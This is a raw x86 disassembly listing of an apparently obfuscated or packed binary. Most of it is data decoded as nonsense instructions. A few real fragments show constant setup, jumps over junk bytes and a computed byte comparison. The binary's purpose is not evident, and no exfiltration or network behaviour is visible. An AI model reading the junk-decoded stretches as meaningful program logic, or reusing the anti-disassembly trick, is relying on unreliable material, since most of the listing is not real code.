  413eb2:	adc    BYTE PTR [ebp+esi*4-0x7a5e274e],al
  413eb9:	cmp    al,0xc0
  413ebb:	aam    0x84
  413ebd:	sbb    eax,0x4dc7444
  413ec2:	loope  0x413f08
  413ec4:	push   0xcb73a615
  413ec9:	lods   al,BYTE PTR ds:[esi]
  413eca:	ret    0xc4c
  413ecd:	add    esi,DWORD PTR [ebx+ebx*8]
  413ed0:	xchg   esp,eax
  413ed1:	into   
  413ed2:	xor    al,0xc4
  413ed4:	repnz out 0xbb,eax
  413ed7:	jno    0x413f06
  413ed9:	pop    ds
  413eda:	or     DWORD PTR [ebx-0x40a9e08c],ebp
  413ee0:	test   DWORD PTR es:[ebp-0x2bf633d0],ebp
  413ee7:	push   ebp
  413ee8:	out    dx,eax
  413ee9:	add    ah,bl
  413eeb:	jmp    0x3107694b
  413ef0:	xor    edx,ecx
  413ef2:	je     0x413f6b
  413ef4:	shr    esi,1
  413ef6:	xor    BYTE PTR [edx+0x3d1d5db1],ah
  413efc:	dec    eax
  413efd:	aas    
  413efe:	xchg   edi,eax
  413eff:	xchg   DWORD PTR [ecx-0x5f],ecx
  413f02:	fisub  DWORD PTR [ebp-0x61b0a6d1]
  413f08:	mov    bl,BYTE PTR [eiz*4-0x2f99621e]
  413f0f:	dec    ebp
  413f10:	xchg   esi,eax
  413f11:	pop    es
  413f12:	lods   eax,DWORD PTR ds:[esi]
  413f13:	std    
  413f14:	out    dx,al
  413f15:	mov    eax,ecx
  413f17:	pop    edi
  413f18:	outs   dx,DWORD PTR ds:[esi]
  413f19:	sti    
  413f1a:	inc    edx
  413f1b:	mov    BYTE PTR [esi+ebx*8],dl
  413f1e:	inc    edx
  413f1f:	adc    eax,0x5b42949a
  413f24:	or     BYTE PTR [ebp+0x49e2eb11],ch
  413f2a:	cmp    dh,BYTE PTR [edx]
  413f2c:	nop
  413f2d:	pop    eax
  413f2e:	mov    ebx,0x837766af
  413f33:	lock add esp,edx
  413f36:	les    edx,FWORD PTR [edx+0x2]
  413f39:	daa    
  413f3a:	or     eax,0x65598b6
  413f3f:	fstp   TBYTE PTR [esi-0x73]
  413f42:	mov    al,ds:0x63d09211
  413f47:	call   0x9e0b53dd
  413f4c:	fcomp  QWORD PTR [edi]
  413f4e:	mov    cl,0x84
  413f50:	or     eax,0xe5507901
  413f55:	mov    gs,WORD PTR [ecx+0x609d8f1b]
  413f5b:	sub    eax,0x9114142c
  413f60:	adc    edx,ecx
  413f62:	popa   
  413f63:	mov    edx,DWORD PTR [edx]
  413f65:	dec    ebx
  413f66:	test   dl,bh
  413f68:	xor    edx,eax
  413f6a:	jmp    0x413eef
  413f6c:	push   0xffffffbd
  413f6e:	sbb    al,0x91
  413f70:	or     al,0xd6
  413f72:	push   ebx
  413f73:	inc    edx
  413f74:	lahf   
  413f75:	push   cs
  413f76:	(bad)  
  413f78:	inc    eax
  413f79:	int3   
  413f7a:	popf   
  413f7b:	cli    
  413f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f7d:	or     al,dl
  413f7f:	xchg   ebp,eax
  413f80:	loopne 0x413fb5
  413f82:	sbb    ah,BYTE PTR [edi]
  413f84:	lahf   
  413f85:	and    ecx,DWORD PTR [ebx-0x231bed90]
  413f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f8c:	mov    ebp,0x459d4125
  413f91:	dec    esp
  413f92:	xchg   BYTE PTR [edi-0x40],al
  413f95:	stc    
  413f96:	push   edx
  413f97:	fist   WORD PTR [ebx-0x70b0999b]
  413f9d:	adc    DWORD PTR [eax+0x2a20034b],ecx
  413fa3:	cwde   
  413fa4:	sub    BYTE PTR ds:0x8b77bc0c,dh
  413faa:	loope  0x413f32
  413fac:	fs pop eax
  413fae:	add    al,0x70
  413fb0:	fild   DWORD PTR [ebx+eiz*2-0x489ccff9]
  413fb8:	sbb    al,0xf3
  413fba:	mov    cl,0x3d
  413fbc:	jnp    0x413fa0
  413fbe:	dec    ebp
  413fbf:	push   eax
  413fc0:	xor    BYTE PTR [edx+0x5a],bl
  413fc3:	loope  0x413f6d
  413fc5:	data16 sub BYTE PTR [edi+0x764a98b],0x49
  413fcd:	leave  
  413fce:	or     ch,al
  413fd0:	and    eax,esi
  413fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd3:	pushf  
  413fd4:	std    
  413fd5:	fidiv  DWORD PTR [ebx+0x61]
  413fd9:	icebp  
  413fda:	mov    cs,edx
  413fdc:	icebp  
  413fdd:	daa    
  413fde:	cwde   
  413fdf:	and    esp,0x67465f49
  413fe5:	mov    dl,0x94
  413fe7:	fsubp  st(0),st
  413fe9:	jp     0x413ffb
  413feb:	loopne 0x41404e
  413fed:	test   eax,0xd8a3967d
  413ff2:	jg     0x414050
  413ff4:	lea    ecx,[edx+ecx*2]
  413ff7:	adc    DWORD PTR [esi-0x7a8e1200],ebp
  413ffd:	lods   al,BYTE PTR ds:[esi]
  413ffe:	or     ch,BYTE PTR [esi+0x15]
  414001:	jge    0x413fc6
  414003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414004:	mov    ah,0x58
  414006:	push   ds
  414007:	push   eax
  414008:	push   edi
  414009:	adc    dl,BYTE PTR [esi-0x22]
  41400c:	adc    DWORD PTR [ebx],edi
  41400e:	sbb    al,0x1d
  414010:	mov    DWORD PTR [ebx+0x61],edx
  414013:	mov    al,ds:0x3a4bd651
  414018:	xchg   ebp,eax
  414019:	adc    dh,BYTE PTR [edi+0x72919425]
  41401f:	stc    
  414020:	mov    ebp,0xb6aadcd1
  414025:	pop    esi
  414026:	mov    al,ds:0xc7e11402
  41402b:	dec    esi
  41402c:	add    al,0xe
  41402e:	sub    ebp,ebx
  414030:	imul   esp,DWORD PTR [esi-0x6f],0xffffff89
  414034:	mov    al,ds:0x68ed1dae
  414039:	sub    edi,esi
  41403b:	push   ebx
  41403c:	ret    
  41403d:	repnz xor eax,0xa486d102
  414043:	dec    ecx
  414044:	in     eax,0xa6
  414046:	test   eax,0x43d95aa8
  41404b:	push   ebx
  41404c:	sub    bh,0x19
  41404f:	mov    DWORD PTR [edx+0x1b3279ce],edi
  414055:	mov    esp,esi
  414057:	add    DWORD PTR [ebx-0x32],0xc5e6179b
  41405e:	(bad)  
  41405f:	adc    al,0x4f
  414061:	jmp    0x730eba3f
  414066:	loopne 0x4140c3
  414068:	mov    bl,0xf6
  41406a:	in     eax,0x60
  41406c:	in     eax,dx
  41406d:	mov    edi,0x5274b86c
  414072:	js     0x414006
  414074:	add    edx,DWORD PTR [edx-0x1d6a2877]
  41407a:	call   FWORD PTR [ebp+0x74d1e4fd]
  414080:	sub    DWORD PTR [edi-0x61],eax
  414083:	call   0xb7ee:0x80763f0
  41408a:	mov    al,ds:0x92a42b75
  41408f:	ret    0x23fc
  414092:	jle    0x4140c7
  414094:	test   BYTE PTR [esi],0xd1
  414097:	scas   al,BYTE PTR es:[edi]
  414098:	pop    edx
  414099:	sub    al,0x9c
  41409b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41409c:	clc    
  41409d:	mov    edi,0x6437420f
  4140a2:	inc    edx
  4140a3:	repnz out dx,eax
  4140a5:	fist   DWORD PTR [ecx]
  4140a7:	pop    ss
  4140a8:	adc    edx,DWORD PTR [ebx-0x3f789e8e]
  4140ae:	scas   eax,DWORD PTR es:[edi]
  4140af:	pop    ecx
  4140b0:	jae    0x4140dc
  4140b2:	xor    eax,0x7c73fbb3
  4140b7:	scas   eax,DWORD PTR es:[edi]
  4140b8:	jno    0x414078
  4140ba:	mov    ds:0x1054afe7,al
  4140bf:	mov    edx,0xf9cbf861
  4140c4:	push   es
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x4220b4
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [esp+ebx*2+0x6a]
  414159:	mov    ecx,0x182c1a7c
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [esi-0x6a],ch
  414165:	mov    fs,eax
  414167:	sub    BYTE PTR [edx],0xe3
  41416a:	jno    0x4141c2
  41416c:	push   esp
  41416d:	inc    ecx
  41416e:	xchg   ebp,eax
  41416f:	fidivr WORD PTR [esi-0x3d]
  414172:	inc    edx
  414173:	jb     0x4141e3
  414175:	mov    ds:0xff2484c1,al
  41417a:	addr16 pusha 
  41417c:	push   ds
  41417d:	dec    ecx
  41417e:	call   0x20606ca1
  414183:	jp     0x4141f7
  414185:	imul   esp,DWORD PTR [ebx],0xffffffad
  414188:	mov    ebp,DWORD PTR [ebx-0x1e20181]
  41418e:	mov    al,BYTE PTR [eax]
  414190:	sahf   
  414191:	in     eax,0x57
  414193:	bsr    ecx,DWORD PTR [eax]
  414196:	mov    BYTE PTR [ebp+0x27686ab5],dl
  41419c:	xor    al,0x49
  41419e:	js     0x4141e3
  4141a0:	lea    edx,[ebp+0x55b70bb2]
  4141a6:	pop    esi
  4141a7:	sbb    ebp,edx
  4141a9:	push   ebp
  4141aa:	mov    DWORD PTR [edx-0x721252a3],esi
  4141b0:	xor    eax,0x60e90d01
  4141b5:	hlt    
  4141b6:	mov    esi,0xb6a62cd3
  4141bb:	xchg   edi,eax
  4141bc:	popa   
  4141bd:	mov    ebp,0x3e154801
  4141c2:	popf   
  4141c3:	fcomi  st,st(1)
  4141c5:	cmc    
  4141c6:	pop    ss
  4141c7:	jmp    0x414160
  4141c9:	cmp    eax,0x8a07c0b4
  4141ce:	pop    ecx
  4141cf:	push   esi
  4141d0:	mov    ebx,0xbbb9a8a2
  4141d5:	add    al,0xef
  4141d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141d8:	and    DWORD PTR [edi+0x21],ebx
  4141db:	inc    ebx
  4141dc:	mov    esp,DWORD PTR [ebp+0x609d6f0b]
  4141e2:	mov    ah,0x3f
  4141e4:	aaa    
  4141e5:	into   
  4141e6:	jge    0x4141df
  4141e8:	jns    0x414250
  4141ea:	dec    ecx
  4141eb:	and    dh,BYTE PTR [esi]
  4141ed:	aaa    
  4141ee:	movd   edi,mm2
  4141f1:	ret    
  4141f2:	pop    ebx
  4141f3:	mov    bl,0x62
  4141f5:	push   edx
  4141f6:	pop    ecx
  4141f7:	jge    0x4141d0
  4141f9:	sar    BYTE PTR [ecx-0x63],1
  4141fc:	popa   
  4141fd:	cmp    BYTE PTR [ecx-0x3c10d1f4],ch
  414203:	sbb    ebp,DWORD PTR [eax]
  414205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414206:	lahf   
  414207:	mov    ecx,0x459ab7e2
  41420c:	jo     0x4141f7
  41420e:	out    dx,eax
  41420f:	add    BYTE PTR [eax+0x92aeaad],dl
  414215:	sahf   
  414216:	xchg   edx,eax
  414217:	dec    edi
  414218:	fdivp  st(1),st
  41421a:	enter  0x8b70,0xfe
  41421e:	mov    ebx,0x7443e05f
  414223:	into   
  414224:	sti    
  414225:	jmp    0x8570:0x8fae3519
  41422c:	pop    eax
  41422d:	jns    0x414287
  41422f:	loop   0x414221
  414231:	repz fbld TBYTE PTR ds:[eax+0x3f]
  414236:	push   es
  414237:	sbb    esi,DWORD PTR ds:0xa769d301
  41423d:	pop    edx
  41423e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41423f:	xor    BYTE PTR [ebx-0x3c768177],bl
  414245:	mov    eax,ds:0x8de29204
  41424a:	sti    
  41424b:	cmp    DWORD PTR [eax-0x39],esp
  41424e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41424f:	pop    ds
  414250:	dec    edx
  414251:	pusha  
  414252:	rcl    DWORD PTR [esi-0x71],0xe3
  414256:	loope  0x4141e3
  414258:	icebp  
  414259:	stos   DWORD PTR es:[edi],eax
  41425a:	fwait
  41425b:	stos   BYTE PTR es:[edi],al
  41425c:	add    esi,edi
  41425e:	and    eax,0x8fdd25df
  414263:	mov    al,0x8d
  414265:	std    
  414266:	dec    edx
  414267:	push   ss
  414268:	test   eax,0xe7b503e8
  41426d:	(bad)  
  41426e:	sbb    al,BYTE PTR [esi+edi*2+0x30883fa]
  414275:	inc    ebp
  414276:	xchg   esp,eax
  414277:	js     0x414255
  414279:	mov    ch,0x82
  41427b:	aad    0x90
  41427d:	push   es
  41427e:	mov    dh,BYTE PTR [ecx-0x4be6439]
  414284:	and    eax,0xfe0a17e6
  414289:	fcmovnb st,st(5)
  41428b:	cmc    
  41428c:	rol    ah,0x9f
  41428f:	int3   
  414290:	push   edi
  414291:	ret    0x7862
  414294:	enter  0x404d,0x2b
  414298:	mov    esp,DWORD PTR [esi-0x5ec7f1db]
  41429e:	out    0x71,al
  4142a0:	inc    ebp
  4142a1:	mov    cl,BYTE PTR [edi]
  4142a3:	stos   BYTE PTR es:[edi],al
  4142a4:	int3   
  4142a5:	cld    
  4142a6:	dec    esp
  4142a7:	push   ss
  4142a8:	js     0x41431b
  4142aa:	loop   0x41425f
  4142ac:	mov    ebx,DWORD PTR [ecx-0x116e66c9]
  4142b2:	mov    eax,ds:0x248ab64c
  4142b7:	dec    esp
  4142b8:	xchg   ecx,eax
  4142b9:	push   ebx
  4142ba:	arpl   WORD PTR [ebx+0x69],bx
  4142bd:	enter  0xcfa1,0xb2
  4142c1:	arpl   bx,sp
  4142c3:	inc    ecx
  4142c4:	in     al,dx
  4142c5:	out    dx,eax
  4142c6:	iret   
  4142c7:	mov    al,ds:0x52a44762
  4142cc:	push   esi
  4142cd:	pop    es
  4142ce:	scas   al,BYTE PTR es:[edi]
  4142cf:	sahf   
  4142d0:	adc    BYTE PTR [eax+0x263c108c],0xa7
  4142d7:	xchg   DWORD PTR [edi-0x77bca59c],edi
  4142dd:	dec    eax
  4142de:	jp     0x414267
  4142e0:	call   0xfab0:0x8c271c01
  4142e7:	mov    ss,WORD PTR [eax+0x71]
  4142ea:	cmp    BYTE PTR [edx+0x6c3883a2],dl
  4142f0:	mov    ecx,0x462fe39c
  4142f5:	xchg   edx,eax
  4142f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f7:	stos   DWORD PTR es:[edi],eax
  4142f8:	fbld   TBYTE PTR [ebx]
  4142fa:	pusha  
  4142fb:	or     eax,esp
  4142fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142fe:	rcr    eax,1
  414300:	fistp  DWORD PTR [esi+0x1787406e]
  414306:	loope  0x414371
  414308:	xor    eax,DWORD PTR [edi]
  41430a:	shl    BYTE PTR [edx+0x47],cl
  41430d:	daa    
  41430e:	and    eax,DWORD PTR [ebp-0x385f263d]
  414314:	and    BYTE PTR [edi+0x73],al
  414317:	pop    ss
  414318:	xchg   DWORD PTR [ecx],esp
  41431a:	push   ebp
  41431b:	pop    edx
  41431c:	xchg   ebp,eax
  41431d:	ins    BYTE PTR es:[edi],dx
  41431e:	inc    ebx
  41431f:	mov    edi,0x2b243a68
  414324:	sbb    ecx,esp
  414326:	or     al,0xb4
  414328:	les    ebp,FWORD PTR [edx+0x1e08b245]
  41432e:	sahf   
  41432f:	nop
  414330:	enter  0x3a06,0x6e
  414334:	add    BYTE PTR [ecx-0x6a],ch
  414337:	shl    DWORD PTR [ebx],1
  414339:	out    0x19,eax
  41433b:	sbb    DWORD PTR [edx*2+0x7d8a332e],esi
  414342:	add    eax,0xb5621e50
  414347:	in     eax,dx
  414348:	in     eax,0xce
  41434a:	retf   
  41434b:	or     al,0x24
  41434d:	ins    DWORD PTR es:[edi],dx
  41434e:	jno    0x4143af
  414350:	or     ebx,ebp
  414352:	outs   dx,DWORD PTR ds:[esi]
  414353:	dec    esp
  414354:	jge    0x4142ff
  414356:	dec    ebp
  414357:	out    0xf2,al
  414359:	inc    esi
  41435a:	shl    DWORD PTR [ebx-0x7c44a8c5],cl
  414360:	pop    esi
  414361:	fwait
  414362:	mov    edi,0x185d4b78
  414367:	jnp    0x4142e9
  414369:	popf   
  41436a:	out    dx,eax
  41436b:	out    0x2b,eax
  41436d:	push   0xee887bf0
  414372:	pop    ss
  414373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414374:	cmp    eax,0xbd78eb64
  414379:	pop    ecx
  41437a:	sbb    dh,dl
  41437c:	mov    DWORD PTR [eax-0x31eccf5f],esp
  414382:	mov    bl,0xc4
  414384:	dec    esi
  414385:	rol    eax,cl
  414387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414388:	push   0x7ce6c9cf
  41438d:	aad    0x13
  41438f:	jg     0x41437f
  414391:	fdivr  DWORD PTR [edx]
  414393:	test   eax,0x64c5b891
  414398:	sti    
  414399:	jl     0x4143d9
  41439b:	inc    esp
  41439c:	jbe    0x41434a
  41439e:	jle    0x414376
  4143a0:	out    0x24,eax
  4143a2:	or     DWORD PTR [esi-0x2235ca3f],0xf6b6f1d3
  4143ac:	ss sub al,0x4c
  4143af:	adc    BYTE PTR [ebx+0x63],cl
  4143b2:	xchg   esp,eax
  4143b3:	stos   BYTE PTR es:[edi],al
  4143b4:	outs   dx,BYTE PTR ds:[esi]
  4143b5:	dec    DWORD PTR [esi+ecx*1]
  4143b8:	int3   
  4143b9:	inc    esi
  4143ba:	lods   al,BYTE PTR ds:[esi]
  4143bb:	lods   al,BYTE PTR ds:[esi]
  4143bc:	jbe    0x41439f
  4143be:	jg     0x41443a
  4143c0:	sbb    eax,0x5a0c7077
  4143c5:	fbstp  TBYTE PTR [eax+eiz*4-0x25]
  4143c9:	push   ds
  4143ca:	pop    ss
  4143cb:	xor    BYTE PTR [eax+edi*2-0x2d097ad9],0x6b
  4143d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d4:	pop    eax
  4143d5:	popf   
  4143d6:	leave  
  4143d7:	jns    0x414360
  4143d9:	fucomp st(7)
  4143db:	sbb    al,0x43
  4143dd:	inc    esi
  4143de:	fwait
  4143df:	outs   dx,DWORD PTR ds:[esi]
  4143e0:	jns    0x414392
  4143e2:	into   
  4143e3:	pop    ecx
  4143e4:	xchg   DWORD PTR [ebx],edi
  4143e6:	ins    BYTE PTR es:[edi],dx
  4143e7:	aaa    
  4143e8:	pop    edx
  4143e9:	scas   eax,DWORD PTR es:[edi]
  4143ea:	call   0x2d829728
  4143ef:	imul   esi,DWORD PTR [eax-0x21],0x6c0dae22
  4143f6:	ja     0x41443c
  4143f8:	(bad)  [edx+0x69]
  4143fb:	jge    0x4143a7
  4143fd:	inc    eax
  4143fe:	shr    BYTE PTR [ecx-0x27ccf187],cl
  414404:	sub    ecx,ecx
  414406:	(bad)  
  414407:	mov    DWORD PTR [ecx+0x49cb1ad9],ecx
  41440d:	xchg   esp,eax
  41440e:	and    DWORD PTR [eax+0x13613364],edi
  414414:	xor    al,0xe9
  414416:	push   ss
  414417:	mov    ah,0xde
  414419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41441a:	rcr    BYTE PTR [esi-0x46e718d6],0x59
  414421:	xchg   esp,eax
  414422:	pop    ss
  414423:	xor    DWORD PTR [edx],esi
  414425:	imul   esp,DWORD PTR [eax+0x54],0x32a24e17
  41442c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41442d:	int3   
  41442e:	xor    eax,0x820c4859
  414433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414434:	xor    BYTE PTR [edi],ch
  414436:	mov    dl,0x55
  414438:	arpl   WORD PTR [edx],bx
  41443a:	and    bl,0x5e
  41443d:	fs stc 
  41443f:	out    dx,eax
  414440:	lock adc ebp,DWORD PTR [ebp-0x1d]
  414444:	sub    esi,esi
  414446:	pushf  
  414447:	rol    DWORD PTR [esi+0x2a],0x50
  41444b:	jecxz  0x4144a7
  41444d:	ret    0x97a7
  414450:	dec    ecx
  414451:	push   ebp
  414452:	fbld   TBYTE PTR [esi+0x55428fc0]
  414458:	xchg   ecx,eax
  414459:	lea    esp,[edi-0x210c9375]
  41445f:	or     ecx,DWORD PTR [ebx-0x6e078222]
  414465:	repz popf 
  414467:	cli    
  414468:	icebp  
  414469:	ret    0xae0a
  41446c:	pop    edx
  41446d:	fldenv [ebx]
  41446f:	add    ah,BYTE PTR [esi-0x48]
  414472:	gs jb  0x414438
  414475:	push   eax
  414476:	mov    dh,0x17
  414478:	(bad)  
  414479:	je     0x414412
  41447b:	xor    DWORD PTR [edx*1-0x4e4cd2d2],0xffffffdb
  414483:	(bad)  
  414484:	enter  0x8ece,0x12
  414488:	in     eax,dx
  414489:	mov    bh,0xcf
  41448b:	cmp    ebp,DWORD PTR [eax-0x59fa129e]
  414491:	sti    
  414492:	iret   
  414493:	ja     0x41448c
  414495:	inc    edi
  414496:	cwde   
  414497:	sub    esi,0x3c
  41449a:	xor    al,0xd4
  41449c:	dec    edi
  41449d:	mov    gs,WORD PTR [edx]
  41449f:	sbb    BYTE PTR [edi+eax*8],bl
  4144a2:	xchg   esp,eax
  4144a3:	adc    eax,0x1f2a3dc4
  4144a8:	outs   dx,BYTE PTR ds:[esi]
  4144a9:	ret    0x3d9a
  4144ac:	mov    edx,0xc41f9fc
  4144b1:	call   0xc95:0xdc9a648d
  4144b8:	ret    0x26ec
  4144bb:	jmp    0x3dab0a2
  4144c0:	(bad)  
  4144c1:	faddp  st(2),st
  4144c3:	sub    al,0x7c
  4144c5:	fiadd  WORD PTR [ebp-0x52]
  4144c8:	mov    cl,0xd6
  4144ca:	les    ebp,FWORD PTR [ecx-0x5a522500]
  4144d0:	fstp   QWORD PTR [edi+0x35903dd6]
  4144d6:	fdiv   QWORD PTR [edx+0x2eeb3a66]
  4144dc:	xchg   ecx,eax
  4144dd:	hlt    
  4144de:	mov    ds:0x431d9815,al
  4144e3:	loopne 0x41455e
  4144e5:	leave  
  4144e6:	enter  0x6119,0xbd
  4144ea:	mov    al,0xd5
  4144ec:	scas   al,BYTE PTR es:[edi]
  4144ed:	jmp    0x4144b2
  4144ef:	or     DWORD PTR [ebx-0x7d63f74d],ecx
  4144f5:	aas    
  4144f6:	les    edi,FWORD PTR [ecx]
  4144f8:	dec    eax
  4144f9:	mov    eax,DWORD PTR [eiz*2-0x22886fe3]
  414500:	add    BYTE PTR [esi+0x719d8bc7],dh
  414506:	mov    DWORD PTR [edi],0xc7de1d58
  41450c:	inc    ebp
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0xbf7c:0x73623c4c
  414595:	pop    esp
  414596:	inc    ebp
  414597:	push   0xffffffd2
  414599:	and    al,0x18
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    bh,ah
  4145a1:	dec    esp
  4145a2:	mov    esi,0x99c33c26
  4145a7:	dec    eax
  4145a8:	ror    DWORD PTR [ebx+0x5677bcb2],cl
  4145ae:	or     DWORD PTR [edi],ecx
  4145b0:	adc    DWORD PTR [eax-0x65142bb7],edi
  4145b6:	cld    
  4145b7:	outs   dx,BYTE PTR ds:[esi]
  4145b8:	mov    ecx,fs
  4145ba:	lea    ebx,[edi-0x7d]
  4145bd:	arpl   WORD PTR [edx-0x58],cx
  4145c0:	test   eax,0x43ce3bc5
  4145c5:	mov    esi,0xe178077d
  4145ca:	and    eax,0x363ab69
  4145cf:	push   esp
  4145d0:	mov    dl,0x73
  4145d2:	mov    cs,WORD PTR [edx-0x27]
  4145d5:	pushf  
  4145d6:	sub    DWORD PTR [ebx],edx
  4145d8:	(bad)  
  4145d9:	lods   eax,DWORD PTR ds:[esi]
  4145da:	outs   dx,BYTE PTR ds:[esi]
  4145db:	or     BYTE PTR [ebx+0x8132639],ch
  4145e1:	inc    edi
  4145e2:	xchg   ebp,eax
  4145e3:	js     0x41456d
  4145e5:	jmp    0xfebffa7b
  4145ea:	mov    ecx,0xd40cafd9
  4145ef:	mov    dh,0xca
  4145f1:	dec    esi
  4145f2:	pop    esi
  4145f3:	sbb    al,0x88
  4145f5:	fbld   TBYTE PTR [edx+eax*2-0x69]
  4145f9:	mov    ds:0x1e81aa2f,eax
  4145fe:	mov    esi,0xcefa64cd
  414603:	out    0xd6,al
  414605:	ds pop ebx
  414607:	jnp    0x4145b6
  414609:	iret   
  41460a:	fdivp  st(0),st
  41460c:	(bad)  
  41460e:	or     ebx,DWORD PTR [edi]
  414610:	sub    bl,BYTE PTR [edx-0x37]
  414613:	lea    ebp,[ebp-0x1e0bf208]
  414619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41461a:	and    bl,BYTE PTR [ebx-0x3e23f843]
  414620:	push   esi
  414621:	out    0x90,eax
  414623:	je     0x41461c
  414625:	fcmove st,st(0)
  414627:	jb     0x414629
  414629:	xchg   esp,eax
  41462a:	pop    esp
  41462b:	cwde   
  41462c:	rcl    edi,cl
  41462e:	mov    ?,WORD PTR [edx+ecx*2]
  414631:	loopne 0x414624
  414633:	retf   
  414634:	mov    bh,0x18
  414636:	and    BYTE PTR [ecx+eax*1],ch
  414639:	shr    bh,1
  41463b:	dec    edx
  41463c:	jns    0x4145cd
  41463e:	outs   dx,BYTE PTR ds:[esi]
  41463f:	popf   
  414640:	add    ecx,0xf0bed8e0
  414646:	and    esi,DWORD PTR [edx]
  414648:	pop    esp
  414649:	sub    bh,BYTE PTR [eax-0x6c]
  41464c:	outs   dx,DWORD PTR ds:[esi]
  41464d:	add    al,0xc7
  41464f:	lahf   
  414650:	fs pop ecx
  414652:	outs   dx,DWORD PTR ds:[esi]
  414653:	sub    al,0x7b
  414655:	repnz enter 0x7190,0x30
  41465a:	ret    
  41465b:	mov    ebp,0x49bec292
  414660:	lock inc esp
  414662:	mov    esp,0x90435e54
  414667:	pop    ds
  414668:	imul   BYTE PTR [edx-0x10]
  41466b:	aas    
  41466c:	xchg   esi,eax
  41466d:	int    0xb7
  41466f:	cmp    DWORD PTR [edi-0x89ef400],ebp
  414675:	js     0x41467b
  414677:	dec    edi
  414678:	jmp    0xf5512aaf
  41467d:	mov    bh,0x1d
  41467f:	and    al,0x9c
  414681:	jns    0x41465c
  414683:	sub    eax,0x2b9678fe
  414688:	xor    al,0xe3
  41468a:	lock dec esi
  41468c:	fnstenv [esi]
  41468e:	inc    esp
  41468f:	xor    esi,DWORD PTR ds:0xe805b2cb
  414695:	xchg   DWORD PTR [ebx+0x5355d62b],ecx
  41469b:	fsubr  st(3),st
  41469d:	jns    0x4146cb
  41469f:	mov    bl,0xe3
  4146a1:	outs   dx,DWORD PTR ds:[esi]
  4146a2:	int    0xa5
  4146a4:	sub    bl,BYTE PTR [edx-0x3b]
